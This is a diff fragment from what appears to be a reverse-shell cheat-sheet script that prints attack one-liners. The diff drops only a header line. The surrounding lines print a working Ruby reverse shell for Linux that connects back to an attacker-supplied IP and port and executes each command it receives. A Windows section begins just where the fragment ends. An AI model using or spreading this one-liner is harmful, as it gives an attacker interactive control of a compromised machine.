@@ -1,4 +1,3 @@
-echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [ruby]\033[m"
 echo -e "\033[31m\033[1mFor Linux hosts:\033[m"
 echo -e "\t\033[1mruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$IP\",\"$PORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\033[m"
 echo -e "\033[31m\033[1mFor Windows hosts:\033[m"
